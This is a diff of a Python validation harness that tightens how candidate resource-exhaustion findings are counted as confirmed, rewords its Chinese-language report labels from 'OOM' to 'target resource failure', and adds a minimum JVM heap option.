@@ -3936,7 +4027,7 @@ def render_report(results: list[ProbeResult]) -> str:
         signal = result.oom_signal or ""
         lines.append(
             f"| `{result.candidate_id}` | `{result.app}` | `{result.status}` | "
-            f"{str(result.true_positive).lower()} | `{signal}` | {result.requests_sent} | {log} |"
+            f"{str(p0.strict_true_positive(result)).lower()} | `{signal}` | {result.requests_sent} | {log} |"
         )
     lines.extend(["", "## 真阳性", ""])
     if verified:
@@ -3947,7 +4038,7 @@ def render_report(results: list[ProbeResult]) -> str:
                     "",
                     f"- 应用：`{result.app}`",
                     f"- 结论：`{result.dynamic_verdict}`",
-                    f"- OOM 信号：`{result.oom_signal}`",
+                    f"- 失败信号：`{result.oom_signal}`",
                     f"- 请求数：{result.requests_sent}",
                     f"- 堆限制：`{result.heap}`",
                     f"- 原始日志：`{result.log}`",
@@ -3956,9 +4047,9 @@ def render_report(results: list[ProbeResult]) -> str:
                 ]
             )
     else:
-        lines.extend(["本轮没有候选达到真实 OOM 真阳性门槛。", ""])
+        lines.extend(["本轮没有候选达到真实目标资源失败真阳性门槛。", ""])
     if completed:
-        lines.extend(["## 已执行但未确认 OOM", ""])
+        lines.extend(["## 已执行但未确认目标资源失败", ""])
         for result in completed:
             log = f"；日志 `{result.log}`" if result.log else ""
             lines.append(f"- `{result.candidate_id}`：`{result.status}`；请求数 {result.requests_sent}{log}；{result.notes}")
@@ -3977,12 +4068,12 @@ def render_report(results: list[ProbeResult]) -> str:
     if first_priority:
         lines.extend(["## 第一优先级补测结果", ""])
         lines.append(
-            f"- 范围：{len(first_priority)} 项；真实 OOM {len(first_verified)}，已执行未确认 OOM {len(first_completed)}，探针错误 {len(first_errors)}，前置条件阻塞 {len(first_blocked)}。"
+            f"- 范围：{len(first_priority)} 项；确认目标资源失败 {len(first_verified)}，已执行未确认 {len(first_completed)}，探针错误 {len(first_errors)}，前置条件阻塞 {len(first_blocked)}。"
         )
         if first_verified:
-            lines.append(f"- 真实 OOM：{', '.join(f'`{result.candidate_id}`' for result in first_verified)}")
+            lines.append(f"- 确认目标资源失败：{', '.join(f'`{result.candidate_id}`' for result in first_verified)}")
         if first_completed:
-            lines.append(f"- 已执行未确认 OOM：{', '.join(f'`{result.candidate_id}`' for result in first_completed)}")
+            lines.append(f"- 已执行未确认：{', '.join(f'`{result.candidate_id}`' for result in first_completed)}")
         if first_errors:
             lines.append(f"- 探针错误：{', '.join(f'`{result.candidate_id}`' for result in first_errors)}")
         if first_blocked:
@@ -4000,7 +4091,11 @@ def write_results(results: list[ProbeResult]) -> None:
     OUT_DIR.mkdir(parents=True, exist_ok=True)
     LOG_DIR.mkdir(parents=True, exist_ok=True)
     RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
-    rows = [result_to_dict(result) for result in results]
+    rows = []
+    for result in results:
+        row = result_to_dict(result)
+        row["true_positive"] = p0.strict_true_positive(result)
+        rows.append(row)
     (OUT_DIR / "summary.json").write_text(json.dumps(rows, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
     with (OUT_DIR / "findings.jsonl").open("w", encoding="utf-8") as handle:
         for row in rows:
@@ -4021,7 +4116,9 @@ def write_results(results: list[ProbeResult]) -> None:
         writer = csv.DictWriter(handle, fieldnames=fieldnames)
         writer.writeheader()
         for result in results:
-            writer.writerow({field: getattr(result, field) for field in fieldnames})
+            row = {field: getattr(result, field) for field in fieldnames}
+            row["true_positive"] = p0.strict_true_positive(result)
+            writer.writerow(row)
     (OUT_DIR / "P1_DYNAMIC_VALIDATION_REPORT.md").write_text(render_report(results), encoding="utf-8")
 
 
@@ -4078,11 +4175,13 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument("--case", action="append", default=[], help="P1 candidate id to run; defaults to all")
     parser.add_argument("--first-priority", action="store_true", help="run only the first-priority P1 precondition-blocked cases")
     parser.add_argument("--runnable-only", action="store_true", help="only run currently implemented P1 probes")
+    parser.add_argument("--min-heap", default="", help="raise every probe JVM heap to at least this size, e.g. 1g")
     return parser.parse_args()
 
 
 def main() -> int:
     args = parse_args()
+    p0.MIN_HEAP_OVERRIDE = args.min_heap
     OUT_DIR.mkdir(parents=True, exist_ok=True)
     LOG_DIR.mkdir(parents=True, exist_ok=True)
     RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
@@ -4093,8 +4192,8 @@ def main() -> int:
     except Exception as exc:
         print(f"application P1 dynamic validation failed: {exc}", file=p0.sys.stderr)
         return 1
-    verified = sum(1 for result in results if result.true_positive)
-    print(f"wrote {rel(OUT_DIR / 'summary.json')} verified_oom={verified}")
+    verified = sum(1 for result in results if p0.strict_true_positive(result))
+    print(f"wrote {rel(OUT_DIR / 'summary.json')} confirmed_resource_failures={verified}")
     return 0
 
 
